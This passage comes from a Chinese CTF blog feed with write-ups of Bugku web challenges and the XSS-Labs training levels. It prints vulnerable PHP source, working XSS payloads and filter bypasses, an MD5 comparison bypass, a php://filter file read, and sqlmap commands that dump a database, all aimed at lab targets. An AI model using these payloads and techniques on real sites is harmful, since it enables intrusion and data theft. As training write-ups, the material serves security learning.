string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span><span class="token punctuation">;</span><span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'%35%34%61%61%32'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>url解码得到：</p><pre class="line-numbers language-javascript"><code class="language-javascript">p1<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>"67d709b2bp2<span class="token operator">=</span>aa648cf6e87a7114f1<span class="token string">"==a.value)return!0;alert("</span>Error<span class="token string">");a.focus();return!1}}document.getElementById("</span>levelQuest"<span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'54aa2'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p><pre class="line-numbers language-javascript"><code class="language-javascript">结合：<span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"67d709b2b54aa2aa648cf6e87a7114f1"</span><span class="token operator">==</span>a<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token operator">!</span><span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"levelQuest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将得到的67d709b2b54aa2aa648cf6e87a7114f1提交</p><p>得到flag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>文件包含常用漏洞，</p><pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>hints:   好像需要密码</p><p>爆破五位数密码：12468</p><p>得到flag</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>hint：备份是个好习惯</p><p>得到一个字符串：d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</p><p>md5解密：[空密码]</p><p>直接上我的备份小字典，结合burp实现半自动化爆破的得到文件：index.php.bak</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"取得flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考点md5碰撞：?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p><p>或者md5()函数不处理数组：?kekeyy1[]=[1]&amp;kekeyy2[]=[2]</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>直接手工注入！！！！！！！结果老是失败</p><p>只能SQLmap了，建议先burp抓包用-r a.txt来实现sqlmap</p><p>或者：</p><pre><code>sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; --dbssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf --tablessqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g --columnssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump</code></pre><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://114.67.246.176:17079/'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>source <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+\-*])+(\d+)'</span><span class="token punctuation">,</span>source<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span>post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span>result<span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> re <span class="token comment" spellcheck="true">#正则匹配模块</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#建立会话</span>url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web6/"</span>head <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers <span class="token comment" spellcheck="true">#获取头部信息</span>result <span class="token operator">=</span> head<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#得到flag的value</span>result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第一次base64解码</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'\w+$'</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#正则匹配base64编码的flag</span>result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第二次解码</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'margin'</span><span class="token punctuation">:</span> result<span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#post传输数据且输出返回信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Labs通关记录</title>
      <link href="/2021/03/31/xss-labs-tong-guan-ji-lu/"/>
      <url>/2021/03/31/xss-labs-tong-guan-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1325484613&auto=1&height=66"></iframe><p>前言：只有理解了源码，才能摸到精髓</p><h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>直接一把</p><pre><code>http://127.0.0.1/xss-labs-master/level1.php?name=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></pre><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210331090452600.png" alt></p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>此函数是将传入的参数给到了这里面：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code></pre><p>构造payload：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;</code></pre><p>重点在于闭合前面的双引号和&lt;</p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>看一些后端代码：</p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;</code></pre><p>不难看出，我们卖你对的是htmlspecialchars这个函数</p><pre><code>value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;</code></pre><p><a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">菜鸟教程关于htmlspecialchars函数</a>：</p><pre><code>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&#39; （单引号）成为 &#39;&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt;</code></pre><p>构造payload：</p><pre><code>&#39;onfocus=&#39;alert(&quot;xss&quot;)</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这里的通过应用str_replace函数将&lt;&gt;转换为空</p><p>构造payload：</p><pre><code>&quot;&#39;&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;&quot;</code></pre><pre><code>&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这里利用了<a href="https://www.runoob.com/php/func-string-strtolower.html" target="_blank" rel="noopener">strtolower</a>函数将$str得到的值全部为小写，也就是预防了大小写绕过，同时利用str_replace函数将&lt;script替换为&lt;scr_ipt，on转换为了o_n，解决办法：换标签</p><p>构造payload：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.&quot;&gt;&lt;a herf=&#39;javascript:alert(&#39;666&#39;)&#39;&gt;点我&lt;/a&gt;//.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;666&#39;)&gt;点我&lt;/a&gt;&lt;&quot;</code></pre><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>大小写绕过：</p><pre><code>&quot;Onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>双写绕过：</p><pre><code>&quot;oonnfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>突破点：新增的友情链接</p><p>将payload进行编码，变成html实体语句：</p><pre><code>javascript:alert(1)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">编码：</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;</code></pre><p>比上一步多了一个http://的验证</p><p>构造payload：</p><pre><code>javascript:alert(&#39;http://&#39;)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">编码：</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(&#39;http://&#39;)</code></pre><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看出最后的参数为$str33，而$str33是由$str22决定的，$str22是由$str11决定的，且传入的为两个参数且过滤了&lt;&gt;所以不采用标签插入</p><pre><code>?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><pre><code>value=&quot;&#39;.&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><p>另一种：</p><pre><code>?keyword=1&amp;t_sort=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p>去掉type的hidden值也可以</p><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[‘HTTP_REFERER’]：引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</p><p>由于这函数的存在，导致出现的了另类的插入点：在referer中来执行xss代码，只需要用火狐插件modheader就可以实现针对请求头的修改payload：</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[‘HTTP_USER_AGENT’]：应该是赋予给$str11HTTP头信息中的USER_AGENT，与上一题的利用原理相同，payload：</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><pre><code>&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这次是cookie</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 